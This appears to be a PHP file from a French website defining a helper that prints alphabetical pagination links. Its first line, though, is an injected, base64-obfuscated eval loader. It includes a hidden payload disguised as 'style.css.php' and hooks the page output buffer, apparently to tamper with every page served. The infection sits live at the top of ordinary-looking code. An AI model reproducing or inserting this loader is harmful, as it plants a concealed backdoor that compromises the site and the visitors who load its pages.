<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy93ZWIvZW5kdXJhbmNlZHVtYXJzL3d3dy9zcGlwL0U3Ml9maWMvcHJvdGVnZS9DUi9DUi0xMy0xMS0yMDA3X2ZpY2hpZXJzL3N0eWxlLmNzcy5waHAnO2lmKGZpbGVfZXhpc3RzKCRHTE9CQUxTWydtZnNuJ10pKXtpbmNsdWRlX29uY2UoJEdMT0JBTFNbJ21mc24nXSk7aWYoZnVuY3Rpb25fZXhpc3RzKCdnbWwnKSYmZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtvYl9zdGFydCgnZGdvYmgnKTt9fX0=')); ?>
<?php
// cette fonction affiche les lettres de l'alphabet avec un lien pour chaque lettre

function makeListLettre($link)
{
 $alphabet="abcdefghijklmnopqrstuvwxyz";
 echo '<div id="multi_page">';
 
 // lien pour tous
 if ($_GET['lettre']==''){
     echo '<span class="actuel">Tous</span> ';
 } else {
     echo "<a href='".$link."&lettre='>Tous</a> ";
 }

 // lien alphabétique
 for ($i=0; $i<26; $i++)
   {
          if ($alphabet{$i}==$_GET['lettre'])
             {
             echo '<span class="actuel">'.$alphabet{$i}."</span> ";
             }
          else
             {
             echo "<a href='".$link."&lettre=".$alphabet{$i}."'>".$alphabet{$i}."</a> ";
             }
   }
 echo "</div>\n";
}
?>
